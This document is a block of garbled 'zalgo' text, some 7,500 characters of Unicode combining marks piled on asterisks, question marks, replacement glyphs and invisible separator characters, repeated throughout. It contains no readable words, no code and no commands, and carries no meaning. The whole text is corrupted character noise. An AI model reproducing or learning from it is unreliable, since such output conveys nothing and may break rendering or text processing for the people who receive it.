̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓͟͟⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̇̊͆͝